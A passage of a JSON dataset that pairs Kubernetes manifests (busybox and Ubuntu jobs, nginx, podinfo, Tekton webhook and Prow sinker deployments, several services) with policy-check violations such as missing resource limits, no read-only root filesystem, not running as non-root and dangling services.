    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: test-job\n  labels:\n    app: service1\nspec:\n  template:\n    metadata:\n      name: test-job\n    spec:\n      containers:\n      - name: test-container\n        image: gcr.io/google_containers/busybox\n        command:\n        - /bin/sh\n        - -c\n        - sleep 10; env\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "1823",
    "manifest_path": "data/manifests/the_stack_sample/sample_0394.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: test-job\n  labels:\n    app: service1\nspec:\n  template:\n    metadata:\n      name: test-job\n    spec:\n      containers:\n      - name: test-container\n        image: gcr.io/google_containers/busybox\n        command:\n        - /bin/sh\n        - -c\n        - sleep 10; env\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"test-container\" is using an invalid container image, \"gcr.io/google_containers/busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1824",
    "manifest_path": "data/manifests/the_stack_sample/sample_0394.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: test-job\n  labels:\n    app: service1\nspec:\n  template:\n    metadata:\n      name: test-job\n    spec:\n      containers:\n      - name: test-container\n        image: gcr.io/google_containers/busybox\n        command:\n        - /bin/sh\n        - -c\n        - sleep 10; env\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"test-container\" does not have a read-only root file system"
  },
  {
    "id": "1825",
    "manifest_path": "data/manifests/the_stack_sample/sample_0394.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: test-job\n  labels:\n    app: service1\nspec:\n  template:\n    metadata:\n      name: test-job\n    spec:\n      containers:\n      - name: test-container\n        image: gcr.io/google_containers/busybox\n        command:\n        - /bin/sh\n        - -c\n        - sleep 10; env\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"test-container\" is not set to runAsNonRoot"
  },
  {
    "id": "1826",
    "manifest_path": "data/manifests/the_stack_sample/sample_0394.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: test-job\n  labels:\n    app: service1\nspec:\n  template:\n    metadata:\n      name: test-job\n    spec:\n      containers:\n      - name: test-container\n        image: gcr.io/google_containers/busybox\n        command:\n        - /bin/sh\n        - -c\n        - sleep 10; env\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"test-container\" has cpu request 0"
  },
  {
    "id": "1827",
    "manifest_path": "data/manifests/the_stack_sample/sample_0394.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: test-job\n  labels:\n    app: service1\nspec:\n  template:\n    metadata:\n      name: test-job\n    spec:\n      containers:\n      - name: test-container\n        image: gcr.io/google_containers/busybox\n        command:\n        - /bin/sh\n        - -c\n        - sleep 10; env\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"test-container\" has memory limit 0"
  },
  {
    "id": "1828",
    "manifest_path": "data/manifests/the_stack_sample/sample_0396.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210427-e4ab4d8c8f\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sinker\" does not have a read-only root file system"
  },
  {
    "id": "1829",
    "manifest_path": "data/manifests/the_stack_sample/sample_0396.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210427-e4ab4d8c8f\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"sinker\" not found"
  },
  {
    "id": "1830",
    "manifest_path": "data/manifests/the_stack_sample/sample_0396.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210427-e4ab4d8c8f\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sinker\" is not set to runAsNonRoot"
  },
  {
    "id": "1831",
    "manifest_path": "data/manifests/the_stack_sample/sample_0396.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210427-e4ab4d8c8f\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sinker\" has cpu request 0"
  },
  {
    "id": "1832",
    "manifest_path": "data/manifests/the_stack_sample/sample_0396.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210427-e4ab4d8c8f\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sinker\" has memory limit 0"
  },
  {
    "id": "1833",
    "manifest_path": "data/manifests/the_stack_sample/sample_0397.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: additional-pod\n  labels:\n    tier: pkad-rs\nspec:\n  containers:\n  - name: additional-pkad\n    image: poznajkubernetes/pkad:blue\n    resources:\n      limits:\n        memory: 128Mi\n        cpu: 500m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"additional-pkad\" does not have a read-only root file system"
  },
  {
    "id": "1834",
    "manifest_path": "data/manifests/the_stack_sample/sample_0397.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: additional-pod\n  labels:\n    tier: pkad-rs\nspec:\n  containers:\n  - name: additional-pkad\n    image: poznajkubernetes/pkad:blue\n    resources:\n      limits:\n        memory: 128Mi\n        cpu: 500m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"additional-pkad\" is not set to runAsNonRoot"
  },
  {
    "id": "1835",
    "manifest_path": "data/manifests/the_stack_sample/sample_0397.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: additional-pod\n  labels:\n    tier: pkad-rs\nspec:\n  containers:\n  - name: additional-pkad\n    image: poznajkubernetes/pkad:blue\n    resources:\n      limits:\n        memory: 128Mi\n        cpu: 500m\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"additional-pkad\" has cpu request 0"
  },
  {
    "id": "1836",
    "manifest_path": "data/manifests/the_stack_sample/sample_0399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:latest\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"server\" is using an invalid container image, \"ubuntu:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1837",
    "manifest_path": "data/manifests/the_stack_sample/sample_0399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:latest\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "1838",
    "manifest_path": "data/manifests/the_stack_sample/sample_0399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:latest\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "1839",
    "manifest_path": "data/manifests/the_stack_sample/sample_0399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:latest\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "1840",
    "manifest_path": "data/manifests/the_stack_sample/sample_0399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ubt\n  namespace: webhook-demo\n  labels:\n    app: ubt\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ubt\n  template:\n    metadata:\n      labels:\n        app: ubt\n    spec:\n      securityContext:\n        runAsNonRoot: false\n        runAsUser: 0\n      containers:\n      - name: server\n        image: ubuntu:latest\n        command:\n        - /bin/bash\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8443\n          name: webhook-api\n        volumeMounts:\n        - name: webhook-tls-certs\n          mountPath: /run/secrets/tls\n          readOnly: true\n      volumes:\n      - name: webhook-tls-certs\n        secret:\n          secretName: webhook-server-tls\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "1841",
    "manifest_path": "data/manifests/the_stack_sample/sample_0403.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: svc-transactions\n  namespace: default\nspec:\n  ports:\n  - name: 8080-tcp\n    port: 8080\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    app: svc-transactions\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:svc-transactions])"
  },
  {
    "id": "1842",
    "manifest_path": "data/manifests/the_stack_sample/sample_0404.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\n    env: dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: dev\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "1843",
    "manifest_path": "data/manifests/the_stack_sample/sample_0404.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\n    env: dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: dev\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "1844",
    "manifest_path": "data/manifests/the_stack_sample/sample_0404.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\n    env: dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: dev\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "1845",
    "manifest_path": "data/manifests/the_stack_sample/sample_0404.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\n    env: dev\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: nginx\n        env: dev\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "1846",
    "manifest_path": "data/manifests/the_stack_sample/sample_0406.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  namespace: webapp\nspec:\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: frontend\n    spec:\n      serviceAccountName: webapp\n      containers:\n      - name: frontend\n        image: stefanprodan/podinfo:3.3.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --level=info\n        - --backend-url=http://backend:9898/echo\n        env:\n        - name: PODINFO_UI_COLOR\n          value: 34577c\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 32Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"frontend\" does not have a read-only root file system"
  },
  {
    "id": "1847",
    "manifest_path": "data/manifests/the_stack_sample/sample_0406.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  namespace: webapp\nspec:\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: frontend\n    spec:\n      serviceAccountName: webapp\n      containers:\n      - name: frontend\n        image: stefanprodan/podinfo:3.3.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --level=info\n        - --backend-url=http://backend:9898/echo\n        env:\n        - name: PODINFO_UI_COLOR\n          value: 34577c\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 32Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"webapp\" not found"
  },
  {
    "id": "1848",
    "manifest_path": "data/manifests/the_stack_sample/sample_0406.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  namespace: webapp\nspec:\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: frontend\n    spec:\n      serviceAccountName: webapp\n      containers:\n      - name: frontend\n        image: stefanprodan/podinfo:3.3.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --level=info\n        - --backend-url=http://backend:9898/echo\n        env:\n        - name: PODINFO_UI_COLOR\n          value: 34577c\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 32Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"frontend\" is not set to runAsNonRoot"
  },
  {
    "id": "1849",
    "manifest_path": "data/manifests/the_stack_sample/sample_0407.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/name: lvm-operator\n  name: controller-manager-metrics-service\n  namespace: system\nspec:\n  ports:\n  - name: https\n    port: 8443\n    protocol: TCP\n    targetPort: https\n  selector:\n    app.kubernetes.io/name: lvm-operator\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/name:lvm-operator])"
  },
  {
    "id": "1850",
    "manifest_path": "data/manifests/the_stack_sample/sample_0410.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: podsync\n  name: podsync\nspec:\n  ports:\n  - name: http\n    port: 8080\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    app: podsync\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:podsync])"
  },
  {
    "id": "1851",
    "manifest_path": "data/manifests/the_stack_sample/sample_0413.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tekton-pipelines-webhook\n  namespace: tekton-pipelines\n  labels:\n    app.kubernetes.io/name: webhook\n    app.kubernetes.io/component: webhook\n    app.kubernetes.io/instance: default\n    app.kubernetes.io/version: v0.18.0\n    app.kubernetes.io/part-of: tekton-pipelines\n    pipeline.tekton.dev/release: v0.18.0\n    version: v0.18.0\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: webhook\n      app.kubernetes.io/component: webhook\n      app.kubernetes.io/instance: default\n      app.kubernetes.io/part-of: tekton-pipelines\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n      labels:\n        app.kubernetes.io/name: webhook\n        app.kubernetes.io/component: webhook\n        app.kubernetes.io/instance: default\n        app.kubernetes.io/version: v0.18.0\n        app.kubernetes.io/part-of: tekton-pipelines\n        pipeline.tekton.dev/release: v0.18.0\n        app: tekton-pipelines-webhook\n        version: v0.18.0\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app.kubernetes.io/name: webhook\n                  app.kubernetes.io/component: webhook\n                  app.kubernetes.io/instance: default\n                  app.kubernetes.io/part-of: tekton-pipelines\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: tekton-pipelines-webhook\n      containers:\n      - name: webhook\n        image: gcr.io/tekton-releases/github.com/tektoncd/pipeline/cmd/webhook:v0.18.0@sha256:622f9d84bc56c12e883f4e5a3936d1321ed369655ea88dc8f7ab61c0108f72dd\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: CONFIG_LEADERELECTION_NAME\n          value: config-leader-election\n        - name: WEBHOOK_SERVICE_NAME\n          value: tekton-pipelines-webhook\n        - name: WEBHOOK_SECRET_NAME\n          value: webhook-certs\n        - name: METRICS_DOMAIN\n          value: tekton.dev/pipeline\n        securityContext:\n          allowPrivilegeEscalation: false\n          runAsUser: 65532\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        - name: https-webhook\n          containerPort: 8443\n        - name: probes\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable WEBHOOK_SECRET_NAME in container \"webhook\" found"
  },
  {
    "id": "1852",
    "manifest_path": "data/manifests/the_stack_sample/sample_0413.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tekton-pipelines-webhook\n  namespace: tekton-pipelines\n  labels:\n    app.kubernetes.io/name: webhook\n    app.kubernetes.io/component: webhook\n    app.kubernetes.io/instance: default\n    app.kubernetes.io/version: v0.18.0\n    app.kubernetes.io/part-of: tekton-pipelines\n    pipeline.tekton.dev/release: v0.18.0\n    version: v0.18.0\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: webhook\n      app.kubernetes.io/component: webhook\n      app.kubernetes.io/instance: default\n      app.kubernetes.io/part-of: tekton-pipelines\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n      labels:\n        app.kubernetes.io/name: webhook\n        app.kubernetes.io/component: webhook\n        app.kubernetes.io/instance: default\n        app.kubernetes.io/version: v0.18.0\n        app.kubernetes.io/part-of: tekton-pipelines\n        pipeline.tekton.dev/release: v0.18.0\n        app: tekton-pipelines-webhook\n        version: v0.18.0\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app.kubernetes.io/name: webhook\n                  app.kubernetes.io/component: webhook\n                  app.kubernetes.io/instance: default\n                  app.kubernetes.io/part-of: tekton-pipelines\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: tekton-pipelines-webhook\n      containers:\n      - name: webhook\n        image: gcr.io/tekton-releases/github.com/tektoncd/pipeline/cmd/webhook:v0.18.0@sha256:622f9d84bc56c12e883f4e5a3936d1321ed369655ea88dc8f7ab61c0108f72dd\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: CONFIG_LEADERELECTION_NAME\n          value: config-leader-election\n        - name: WEBHOOK_SERVICE_NAME\n          value: tekton-pipelines-webhook\n        - name: WEBHOOK_SECRET_NAME\n          value: webhook-certs\n        - name: METRICS_DOMAIN\n          value: tekton.dev/pipeline\n        securityContext:\n          allowPrivilegeEscalation: false\n          runAsUser: 65532\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        - name: https-webhook\n          containerPort: 8443\n        - name: probes\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: probes\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 